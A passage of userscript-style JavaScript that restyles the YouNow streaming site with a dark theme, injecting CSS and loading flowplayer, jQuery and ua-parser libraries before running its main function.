                '#previousStream .header a:hover, #previousStream .header span:hover {background: #444;}'+
                '#previousStream .header span {cursor: pointer; float: right; border-right: none; border-left: 1px solid #555;}' +
                '#previousStream .header div {color: #ddd; font-weight: normal; width: 450px; font-size: 11px; background: #333; border: 1px solid #555; display:none; position: absolute; right: 0px; top: 30px;padding: 10px;}' +
                '#previousStream #stream {width: 100%; height: calc(100% - 30px);}' +
                '#profile {width: 100%; height:100%;}' +
                '#profile .buttons { clear: both; margin-top: 10px; bottom: 100px; float: right; right: 0px; }' +
                '#profile .buttons button img { width: 16px; margin-right: 5px; }' +
                '#profile .live { right: 5px; top: 5px; position: absolute; }' +
                '#profile .live img { width: 80px; }' +
                '#profile #dashboardComments {width:100%;}' +
                '#profile .entry {background: #333; border: 1px solid #222;margin-top: 10px; width: 100%;float: left; clear:both;padding-bottom: 0px;}' +
                '#profile .userEntry {background: transparent !important; margin-top: 5px;}' +
                '#profile .entry .header {float:left; display: block; clear:both;width:calc(100% - 30px);padding: 6px;}' +
                '#profile .userEntry .header {width:100% !important;}' +
                '#profile .entry .header img {float: left; display: block; margin-right: 10px;width:40px;height:40px;}' +
                '#profile .entry .header div {float: left; display: block;width:calc(100% - 55px);}' +
                '#profile .entry .options {float: right; margin-right: 5px;margin-top:5px;}' +
                '#profile .entry .options .optionsMenu {position: absolute; margin-top: 2px;right: 20px;background:#444;border:1px solid #111;}' +
                '#profile .entry .options .optionsMenu li {float:left;clear:both; background:#444;color:#ddd; padding: 10px;cursor:pointer;padding-top:5px; padding-bottom:5px;}' +
                '#profile .entry .options .optionsMenu li:hover {float:left;clear:both; background:#555;}' +
                '#profile .entry .header div strong {text-decoration:none;float: left; display: block; color:#ddd; font-size:16px;}' +
                '#profile .entry .header div strong img {margin-top: 3px;width:auto;height:auto;margin-right:0px;}' +
                '#profile .entry .header div small {float: left; display: text-decoration:none; block;clear:both; color: #aaa;font-size:12px;}' +
                '#profile .entry .content {float: left; clear: both; width: 100%; padding: 6px;padding-top:0px;}' +
                '#profile .entry .content .stream img {float: left; border-radius: 6px 0px 0px 6px; display: block; width:200px; height:141px;}' +
                '#profile .entry .content .stream .play {border-radius: 0px; position: absolute; margin-left: 70px; width: 60px; height: 60px; margin-top: 40px;}' +
                '#profile .entry .content .stream div {float: left; display: block; width:calc(100% - 200px); padding: 10px; padding-left: 20px; height:141px;}' +
                '#profile .entry .content .stream div img {width: auto; height: auto; border-radius: 0px;}' +
                '#profile .entry .content .stream div div {width: auto; padding: 0px; height: auto;}' +
                '#profile .entry .content .stream div strong {font-size: 14px; color: #ddd;display: block; float:left;clear:both;}' +
                '#profile .entry .content .stream div small {font-size: 14px; color: #ddd;display:block; float:left; clear:noneh;}' +
                '#profile .entry .content .stream {float: left;border: 1px solid #555; border-radius: 6px; clear:both;width:100%;height:143px;}' +
                '#profile .entry .content .stream div .icon {display: block; float: left; margin-top:5px !important; margin-bottom: 0px !important;width:16px; clear: both; margin-right: 5px !important; margin-left:0px !important;}' +
                '#profile .entry .content .stream div .label {display: block; margin: 0px; padding: 0px !important; font-weight: normal; float: left; margin-top: 5px;}' +
                '#profile .entry .content .stream div div img {margin: 3px;margin-top:0px; margin-bottom:6px;}' +
                '#profile .entry .content .text {float: left;clear:both;width:100%; color:#ccc;}' +
                '#profile .entry .content .image {float: left;clear:both;width:100%;}' +
                '#profile .entry .like {cursor: pointer; float: left; padding-left: 5px; border-top: 1px solid #555 !important; padding-top: 3px; padding-bottom: 3px; clear:both;width:100%; color:#ddd;}' +
                '#profile .entry .like img {float: left;margin-right: 5px;}' +
                '#profile .entry .comment {border-top: 2px solid #555; float: left;clear:both;width:100%;padding: 6px;margin-bottom: 0px;}' +
                '#profile .entry .comment img {float: left; width: 30px; height: 30px;}' +
                '#profile .entry .comment input {background: #333; border: none; width: calc(100% - 30px);margin:0px;height:30px;}' +
                '#profile .entry .reply {border-top: 1px solid #555; padding-top:5px; background: #222; float: left;clear:both;width:100%;}' +
                '#profile #profileHeader {width: 100%; float: left; clear: both; height: 100%; overflow: hidden;}' +
                '#profile #profileHeader .header {position: relative;height: 330px; width: 100%; float: left; clear: both; overflow: hidden;}' +
                '#profile #profileHeader .header img {width: 100%; position: absolute; top: -100%; bottom: -100%; left: 0; right: 0; margin: auto;}' +
                '#profile #profileHeader .userBox {position: absolute; right: 20px; top: 20px;}' +
                '#profile #profileHeader .userBar {float: left; clear: both; background: #222; border-radius: 12px; border: 2px solid #444; -webkit-box-shadow: 0px 2px 18px 0px rgba(0,0,0,0.75);-moz-box-shadow: 0px 2px 18px 0px rgba(0,0,0,0.75);box-shadow: 0px 2px 18px 0px rgba(0,0,0,0.75);}' +
                '#profile #profileHeader .userBar img {float: right; border-radius: 0px 12px 12px 0px; }' +
                '#profile #profileHeader .userBar .info {float: left; padding: 5px; color: #ddd; width: 290px; }' +
                '#profile #profileHeader .userBar .info strong {font-weight: bold; font-size: 13px; }' +
                '#profile #profileHeader .userBar .info strong span { font-size: 13px; }' +
                '#profile #profileBottom {position: relative; left: 0px; top: 280px; width: 100%; height: calc(100% - 280px); }' +
                '#profile #profileBottom .fade {position: absolute; padding-left: 10px; top: 0; opacity: 1 !important; z-index: 100; height: 60px; float: left; clear: both; width: 100%; background: -moz-linear-gradient(top, rgba(0,0,0,0) 0%, rgba(0,0,0,1) 100%);background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(0,0,0,0)), color-stop(100%,rgba(0,0,0,1)));background: -webkit-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: -o-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: -ms-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: linear-gradient(to bottom, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr=\'#00000000\', endColorstr=\'#000000\',GradientType=0 );}' +
                '#profile #profileBottom .fade a {display: block; margin-left: 10px; height: 40px; font-size: 15px; color: #ddd; text-decoration: none; cursor:pointer; float: left; margin-top: 10px; background: rgba(0,0,0,0.2); border: 1px solid #000; border-radius:6px 6px 0px 0px; padding-top: 9px; font-weight: bold; padding-left: 15px;padding-right: 15px;}' +
                '#profile #profileBottom .fade a.active, #profile #profileBottom .fade a:hover {background: #000;}' +
                '#profile #profileContent {background: #000; position: absolute; top: 60px; height: calc(100% - 60px); width: 100%; padding: 20px; padding-top:10px; float:left; clear:both; overflow: auto; }' +
                '#settings .tabBar a {height: 20px; display: block; float: left; background: #333; height: 30px; padding-top:5px; padding-bottom: 5px; border-bottom: 1px solid #666; border-right: 1px solid #666; cursor: pointer; text-align: center; color: #ddd; text-decoration:none; font-weight: bold;}' +
                '#settings .tabBar a.active, #settings .tabBar a:hover {background:#555;}' +
                '#settingsContainer { padding: 10px;float:left; clear: both; }' +
                '#darkPage #left li .header {width: 100%; border-bottom: 1px solid #777; padding: 10px; padding-top: 5px; padding-bottom: 5px; background:#555; height: 30px; color:#ddd; font-weight: bold; cursor: pointer; }' +
                '#darkPage #left li .content {width: 100%; border-bottom: 1px solid #111; padding: 10px; overflow-y: auto; overflow-x: hidden; height:calc(100% - 30px); }' +
                '#darkPage {position:absolute; top: 50px; left: 0px; z-index:100; width: 100%; height: calc(100% - 50px);}' +
                '#darkPage #left {float: left; width: 200px; border-right: 1px solid #999; height:100%; background:#333;}' +
                '#darkPage #right {float: left; width: calc(100% - 201px); height:100%; background:#000;}' +
                '#darkPage #userList {padding: 20px; float: left; width: 100%; height:100%; overflow-y:auto;}' +
                '#darkPage .userProfile {float: left; display: block; width: 142px; height: 185px; margin: 5px; background: #333; border: 1px solid #555; border-radius: 5px; }' +
                '#darkPage .userProfile div {border: 1px solid #111; background: url(http://cdn2.younow.com/images/nothumb.jpg) no-repeat; background-size: 130px 130px; float: left; clear: both; width: 140px; height: 140px; overflow: hidden;border-radius:5px 5px 0px 0px; }' +
                '#darkPage .userProfile div img {height: 140px; float: left; clear: both; display: block; position: relative; margin-top: 0px; }' +
                '#darkPage .userProfile div span {padding-left: 5px; position: relative; margin-top: -30px; float: left; clear: both; z-index:500; line-height: 30px; font-weight: bold; color: #fff; display: block; width:173px;height:30px; font-size:14px;background: -moz-linear-gradient(top, rgba(0,0,0,0) 0%, rgba(0,0,0,1) 100%);background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(0,0,0,0)), color-stop(100%,rgba(0,0,0,1)));background: -webkit-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: -o-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: -ms-linear-gradient(top, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);background: linear-gradient(to bottom, rgba(0,0,0,0) 0%,rgba(0,0,0,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr=\'#00000000\', endColorstr=\'#000000\',GradientType=0 ); }' +
                '#darkPage .userProfile img {float: left; margin-top:3px; margin-right: 3px; }' +
                '#darkPage .userProfile strong {padding-left: 5px; padding-right: 5px; padding-top: 5px;color: #fff; white-space: nowrap; line-height: 22px; display: block; float: left; width: 130px; height:22px; overflow: hidden; text-overflow: ellipsis; clear: both; }' +
                '#darkPage .userProfile small {padding-left: 5px; padding-right: 5px; padding-bottom: 5px;color: #999; display:block; float: left; clear: both; }' +
                '#darkPage h2 {color: #eee; margin-top:0px;}' +
                '#darkPage h3 {color: #eee; margin-top:0px;}' +
                '#darkPage h4 {color: #eee; margin-top:0px;}' +
                '#darkPage #left strong {color: #ddd; margin-top:0px; height: 20px; line-height: 20px; }' +
                '#darkPage #left a { color: #aaa; }' +
                '#trendingPeople, #trendingTags, #featuredUsers, #friends { overflow: hidden; overflow-y: auto; }' +
                '#stream { width: 100%; height: 100%; }' +
                '#streamInfo { width: 100%; line-height: 40px; padding-left: 5px; color: #ddd; height: 40px; float: left; clear: both; background: #333; border-bottom: 1px solid #555;}' +
                '#stream .outer { width: 100%; height: calc(100% - 180px); float:left; clear:both; border-bottom: 1px solid #555; }' +
                '#stream .stream { width: calc(100% - 360px); height: 100%; float: left; }' +
                '#stream #streamView { width: 100%; height: calc(100% - 30px); }' +
                '#stream #streamBar { width: 100%; height: 30px; background: #333; color: #eee; border-top: 1px solid #555;}' +
                '#stream #streamInfo .right { float: right; color: #faa; font-weight: bold; margin-right: 5px;}' +
                '#stream #streamBar .item { float: left; margin-top: 5px; margin-right: 5px; margin-left: 5px;}' +
                '#stream #streamBar .item img { float: left; margin-top:2px;height: 16px; margin-right: 5px; }' +
                '#stream #chat { float: right !important; width: 360px !important; border-left: 1px solid #333; height: 100%; float: right;}' +
                '#stream #chat a.tab { cursor: pointer; color: #ddd; text-align: center; text-decoration: none; font-size:12px; font-weight: bold; float: left; border-bottom: 1px solid #555; height: 25px; line-height:25px; width: 119px; border-right: 1px solid #666; background: #333; }' +
                '#stream #chat a.last { border-right: none !important; width: 120px !important; }' +
                '#stream #chat a:hover.tab, #stream #chat a.active { background: #555; }' +
                '#stream #infoList { display: none; padding: 5px; overflow-y: auto; overflow-x:hidden; height: calc(100% - 25px); clear: both;}' +
                '#stream #infoList h2 { padding-left: 5px; width: 100%; font-size: 14px; float: left; clear: both; font-weight: bold; margin: 0px; margin-bottom: 5px; padding-bottom: 3px; border-bottom: 1px solid #555;}' +
                '#stream #infoList div.label { float: left; text-align: left; clear: both; color: #ddd; font-weight:bold; width: 140px; }' +
                '#stream #infoList div.value { float: right; font-size: 11px; color: #bbb; width: 190px; text-align:right; }' +
                '#stream #viewerList { display: none; padding: 5px; overflow-y: auto; overflow-x:hidden; height: calc(100% - 25px); clear: both;}' +
                '#stream #viewerList li { margin: 5px; clear: both; float: left; }' +
                '#stream #viewerList li img { float: left; margin-right: 5px; }' +
                '#stream #viewerList li span { font-family: Segoe UI; font-size: 14px; display: block; float: left; max-width: 270px; color: #ddd; font-weight: bold;}' +
                '#stream #viewerList li small { font-family: Segoe UI; font-size: 12px; display: block; float: left; clear: both; max-width: 270px; color: #999;}' +
                '#stream #chatMessages { padding: 5px; overflow-y: auto; overflow-x:hidden; height: calc(100% - 170px); clear: both;}' +
                '#stream #chatMessages li { margin: 5px; clear: both; float: left; }' +
                '#stream #chatMessages li img { float: left; margin-right: 5px; }' +
                '#stream #chatMessages li span { font-family: Segoe UI; font-size: 12px; display: block; float: left; max-width: 270px;}' +
                '#stream #chatOptions { padding: 10px; color: #ddd; width: 360px; height: 95px; border-top: 1px solid #555; background: #222; }' +
                '#stream #chatOptions input { margin-left: 5px; margin-right: 5px; color: #000; }' +
                '#stream #chat textarea { height: 50px; width: 360px; padding: 5px; border: 1px solid #555; color: #eee; background: #333; max-width: 360px; max-height: 50px;}' +
                '#stream #trendingList { height: 140px; width: 100%; position: absolute; bottom: 0px; padding: 10px; overflow-x: auto; white-space: nowrap; }' +
                '#stream #trendingList img { width: 133px; height: 100px; margin-right: 5px; display: inline-block; }' +
                '#tooltip { color: #ddd; position: absolute; z-index: 10000; background: #333; -webkit-box-shadow: 5px 5px 5px 0px rgba(0,0,0,0.75);-moz-box-shadow: 5px 5px 5px 0px rgba(0,0,0,0.75);box-shadow: 5px 5px 5px 0px rgba(0,0,0,0.75); }' +
                '#tooltip .img { float: left; width: 128px; height: 128px; }' +
                '#tooltip .wide { width: 170px !important; }' +
                '#tooltip .content { float: left; min-width: 200px; }' +
                '#tooltip .title { float: left; padding-top: 4px; padding-left: 5px; clear: both; width: 100%; height: 25px; background: #666; color: #ddd; font-weight: bold; font-size: 13px; }' +
                '#tooltip .value { float: left; clear: both; margin-left: 5px; margin-top: 5px; color: #999; }' +
                '#tooltip .value img { float: left; }' +
                '#tooltip .value span { float: left; margin-left: 5px; }' +
                '.dropdown-menu {background: #555 !important;}' +
                '.dropdown-menu li {border-top-color: #666 !important;}' +
                '.dropdown-menu li a {color: #eee !important;}' +
                '.dropdown-menu li a:hover {background: #666 !important;}' +
                '.dropdown-menu .active, .searchResult-more {background: #777 !important;}' +
                'span {color: #fff !important;}' +
                '.error {margin: 20px; border-radius:10px; border:1px solid #f00; background:#a00;padding:10px;font-size:20px;text-align:center;color: #fff !important;}' +
                '.line-clamp:after {background: none !important;}' +
                '.user {background: #777 !important; color: #eee !important;}' +
                '.ynicon-carrot-up {color: #777 !important;}' +
                '.ynicon-user, .ynicon-settings, .ynicon-audience, .ynicon-logout {color: #eee !important;}';
            darkModeLoader = document.createElement("div");
            darkModeLoader.setAttribute("id", "darkModeLoader");
            var span = document.createElement("span");
            span.style.opacity = 0;
            span.setAttribute("id", "darkModeLoaderLabel");
            span.innerHTML = "Loading...";
            darkModeLoader.appendChild(span);

            document.body.appendChild(darkModeLoader);
        }

        var head = document.head || document.getElementsByTagName('head')[0];
        var style = document.createElement('style');
        style.type = 'text/css';
        if (style.styleSheet)
            style.styleSheet.cssText = css;
        else
            style.appendChild(document.createTextNode(css));
        head.appendChild(style);

        var script1 = document.createElement("script");
        script1.setAttribute("type", "text/javascript");
        script1.addEventListener('load', function() {
            var script = document.createElement("script");
            script.setAttribute("type", "text/javascript");
            script.addEventListener('load', function() {
                var script2 = document.createElement("script");
                script2.setAttribute("src", "https://faisalman.github.io/ua-parser-js/src/ua-parser.js");
                script2.addEventListener('load', function() {
                    var script = document.createElement("script");
                    script.textContent = "(" + callback.toString() + ")();";
                    document.body.appendChild(script);
                });
                document.body.appendChild(script2);
            }, false);
            script.setAttribute("src", "https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js");
            document.body.appendChild(script);
        });
        script1.setAttribute("src", "https://FluffyFishGames.github.io/flowplayer.min.js");
        document.body.appendChild(script1);
    }

    var waitForYouNow = setInterval(function() {
        if (document.body.getElementsByClassName("nav-logo").length > 0) {
            startDarkMode();
            clearInterval(waitForYouNow);
        }
    }, 100);

}

// Inject our main script. Yes, this is bad. But you are trying to do bad things either.
var script = document.createElement('script');
script.type = "text/javascript";
script.textContent = '(' + main.toString() + ')(window);';
document.body.appendChild(script);